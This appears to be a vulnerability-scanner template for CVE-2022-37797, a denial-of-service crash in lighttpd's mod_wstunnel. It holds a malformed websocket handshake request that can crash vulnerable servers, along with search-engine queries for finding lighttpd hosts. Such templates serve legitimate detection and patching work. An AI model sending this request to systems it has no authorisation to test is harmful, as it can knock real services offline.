id: CVE-2022-37797

info:
  name: Lighttpd mod_wstunnel Null Pointer Dereference DoS
  author: ProjectDiscoveryAI
  severity: high
  description: |
    In lighttpd 1.4.65, mod_wstunnel does not initialize a handler function pointer if an invalid HTTP request (websocket handshake) is received, leading to null pointer dereference which crashes the server.
  reference:
    - https://lists.debian.org/debian-lts-announce/2022/10/msg00002.html
    - https://security.gentoo.org/glsa/202210-12
    - https://www.debian.org/security/2022/dsa-5243
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2022-37797
    cwe-id: CWE-476
  metadata:
    vendor: lighttpd
    product: lighttpd
    shodan-query:
      - cpe:"cpe:2.3:a:lighttpd:lighttpd"
      - http.title:"powered by lighttpd"
      - if you find a bug in this lighttpd package, or in lighttpd itself
    fofa-query: title="powered by lighttpd"
    google-query: intitle:"powered by lighttpd"
  impact: |
    Denial of Service (DoS) due to null pointer dereference in Lighttpd mod_wstunnel
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version

http:
  - raw:
      - |
        GET /ws/ HTTP/1.1
        Host: {{Hostname}}
        Sec-WebSocket-Version: x
        Sec-WebSocket-Extensions: permessage-deflate
        Sec-WebSocket-Key: FCM5bSXLZW322otNERLYNA==
        Connection: keep-alive, Upgrade
        Sec-Fetch-Dest: websocket
        Sec-Fetch-Mode: websocket
        Sec-Fetch-Site: same-origin
        Upgrade: websocket

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 400
      - type: word
        words:
          - "Bad Request"
        part: body